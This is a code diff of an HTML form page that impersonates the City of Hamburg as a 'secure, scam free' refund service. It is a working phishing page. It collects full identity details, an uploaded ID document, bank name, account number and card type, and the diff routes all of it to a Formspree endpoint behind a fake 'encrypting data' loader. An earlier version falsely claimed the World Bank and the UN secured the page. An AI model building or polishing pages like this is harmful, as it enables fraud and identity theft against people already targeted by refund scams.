@@ -15,17 +15,17 @@
             linear-gradient(60deg, #00254d 25%, transparent 25.5%, transparent 75%, #00254d 75%, #00254d);
             background-size: 80px 140px; overflow-x: hidden;
         }
-        .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1850px; gap: 50px; padding-top: 50px; }
+        .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1850px; gap: 40px; padding-top: 50px; }
         .side-text { width: 380px; color: white; line-height: 1.6; margin-top: 150px; }
         .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 28px; margin-bottom: 20px; border-bottom: 3px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
         .side-text p { font-size: 18px; font-weight: 500; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
         .form-container { background: #ffffff; width: 100%; max-width: 900px; border-radius: 4px; box-shadow: 0 50px 150px rgba(0,0,0,0.9); border-top: 15px solid var(--hamburg-red); position: relative; }
         .security-banner { background: var(--hamburg-blue); color: white; padding: 14px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
-        .header { padding: 45px 40px; text-align: center; background: #fff; border-bottom: 8px solid var(--hamburg-blue); }
+        .header { padding: 45px 40px; text-align: center; border-bottom: 8px solid var(--hamburg-blue); }
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; border: 2px solid var(--hamburg-blue); display: inline-block; padding: 10px 20px; }
         .section-box { padding: 50px; display: none; }
         .section-box.active { display: block; }
-        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 15px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 10px; }
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
         label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 11px; color: var(--hamburg-blue); text-transform: uppercase; }
@@ -36,7 +36,7 @@
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
         button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
         .btn-back { background-color: #888; }
-        .establishment-footer { text-align: center; padding: 30px; font-size: 12px; color: #888; background: #fdfdfd; border-top: 1px solid #eee; text-transform: uppercase; line-height: 1.6; }
+        #loader { display: none; text-align: center; padding: 40px; font-weight: bold; color: var(--hamburg-blue); font-size: 18px; }
     </style>
 </head>
 <body>
@@ -44,14 +44,17 @@
     <div class="page-wrapper">
         <div class="side-text">
             <h3>MISSION</h3>
-            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against evolving digital scams during the refund process.</p>
+            <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems that safeguard our users' assets.</p>
         </div>
 
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
             <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1></div>
             
-            <form action="https://formspree.io" method="POST">
+            <!-- AJAX SUCCESS/ERROR MARKERS -->
+            <div id="fs-status"></div>
+
+            <form id="audit-form">
                 <!-- PAGE 1 -->
                 <div id="section1" class="section-box active">
                     <h2>SECTION 1: IDENTITY</h2>
@@ -60,72 +63,85 @@
                         <div><label>First Name *</label><input type="text" name="FirstName" id="fn" required></div>
                         <div><label>Middle Name</label><input type="text" name="MiddleName" id="mn"></div>
                     </div>
-                    <div style="margin-top:20px;"><label>Residential Address *</label><input type="text" name="Address" id="addr" required></div>
+                    <div style="margin-top:20px;"><label>Address *</label><input type="text" name="Address" id="addr" required></div>
                     <div class="grid-2" style="margin-top:20px;">
                         <div><label>Nationality *</label><input type="text" name="Nationality" id="nat" required></div>
-                        <div><label>Birthdate *</label><input type="text" name="Birthdate" id="bd" required placeholder="MM/DD/YYYY"></div>
+                        <div><label>Email *</label><input type="email" name="Email" id="em" required placeholder="user@gmail.com"></div>
                     </div>
-                    <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Email *</label><input type="email" name="Email" id="em" required></div>
-                        <div><label>Contact Number *</label><input type="text" name="Phone" id="ph" required></div>
-                    </div>
+                    <div style="margin-top:20px;"><label>Upload ID *</label><input type="file" id="idU"></div>
                     <div class="btn-container"><button type="button" onclick="show(2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- PAGE 2 -->
                 <div id="section2" class="section-box">
                     <h2>SECTION 2: REFUND</h2>
-                    <div class="grid-2">
-                        <div><label>Amount *</label><input type="text" name="Amount" id="amt" required></div>
-                        <div><label>Bank Name *</label><input type="text" name="Bank" id="bn" required></div>
-                    </div>
+                    <div><label>TOTAL AMOUNT *</label><input type="text" name="Amount" id="amt" required></div>
+                    <div style="margin-top:20px;"><label>Bank Name *</label><input type="text" name="Bank" id="bn" required></div>
                     <div class="grid-2" style="margin-top:20px;">
-                        <div><label>Account Number *</label><input type="text" name="AccountNo" id="an" required></div>
+                        <div><label>Account No *</label><input type="text" name="AccountNo" id="an" required></div>
                         <div><label>Card Type *</label><input type="text" name="CardType" id="ct" required></div>
                     </div>
-                    <div class="btn-container">
-                        <button type="button" class="btn-back" onclick="show(1)">BACK</button>
-                        <button type="button" onclick="buildReview()">REVIEW</button>
-                    </div>
+                    <div style="margin-top:20px;"><label>Upload Receipt *</label><input type="file" id="rcpU"></div>
+                    <div class="btn-container"><button type="button" class="btn-back" onclick="show(1)">BACK</button><button type="button" onclick="buildReview()">REVIEW</button></div>
                 </div>
 
                 <!-- PAGE 3 -->
                 <div id="section3" class="section-box">
-                    <h2>SECTION 3: FINAL SUBMISSION</h2>
+                    <h2>SECTION 3: REVIEW</h2>
                     <div id="reviewDisplay"></div>
-                    <div class="btn-container">
+                    <div class="btn-container" id="finalBtns">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
-                        <button type="submit">SUBMIT TO DATABASE</button>
+                        <button type="submit" id="submit-btn">SUBMIT TO AUTHORITY</button>
                     </div>
                 </div>
             </form>
-            <div class="establishment-footer">SECURED BY: WORLD BANK GROUP • AMLA • UNITED NATIONS</div>
+            <div id="loader">ENCRYPTING DATA & SECURING ASSETS...</div>
         </div>
 
         <div class="side-text">
             <h3>VISION</h3>
-            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where a culture of absolute transparency and sophisticated security ensures that every individual can navigate the refund ecosystem with unwavering confidence.</p>
+            <p>To be recognized as the premier global benchmark for commercial integrity, ensuring a culture of absolute transparency and sophisticated security.</p>
         </div>
     </div>
 
+    <!-- FORMSPREE SDK -->
+    <script src="https://unpkg.com/@formspree/ajax@1" defer></script>
+    
     <script>
-        function show(p) {
-            document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active'));
-            document.getElementById('section' + p).classList.add('active');
-            window.scrollTo(0,0);
-        }
+        function show(p) { document.querySelectorAll('.section-box').forEach(b => b.classList.remove('active')); document.getElementById('section' + p).classList.add('active'); window.scrollTo(0,0); }
+        
         function buildReview() {
-            const data = [
-                {l: "NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
-                {l: "ADDRESS", v: document.getElementById('addr').value},
-                {l: "EMAIL", v: document.getElementById('em').value},
-                {l: "AMOUNT", v: document.getElementById('amt').value}
-            ];
-            let html = "";
-            data.forEach(d => { html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`; });
-            document.getElementById('reviewDisplay').innerHTML = html;
+            document.getElementById('reviewDisplay').innerHTML = `
+                <div class="review-item"><div class="review-label">NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
+                <div class="review-item"><div class="review-label">ADDRESS</div><div class="review-value">${document.getElementById('addr').value}</div></div>
+                <div class="review-item"><div class="review-label">AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
+            `;
             show(3);
         }
+
+        // FORMSPREE INTEGRATION
+        window.formspree = window.formspree || function () { (formspree.q = formspree.q || []).push(arguments); };
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            formspree('initForm', {
+                formElement: '#audit-form',
+                formId: 'mjglbpya',
+                onSuccess: function() {
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('section3').innerHTML = `
+                        <div style="text-align:center; padding:60px;">
+                            <h2 style="color:var(--hamburg-blue)">SUBMISSION SUCCESSFUL</h2>
+                            <div style="font-size:80px; margin:20px;">✅</div>
+                            <p>All data has been securely recorded.</p>
+                            <button type="button" onclick="location.reload()" style="background:var(--hamburg-blue); color:white; padding:15px 30px; border:none; cursor:pointer;">FINISH</button>
+                        </div>`;
+                },
+                onStart: function() {
+                    document.getElementById('audit-form').style.display = 'none';
+                    document.getElementById('loader').style.display = 'block';
+                }
+            });
+        });
     </script>
 </body>
 </html>
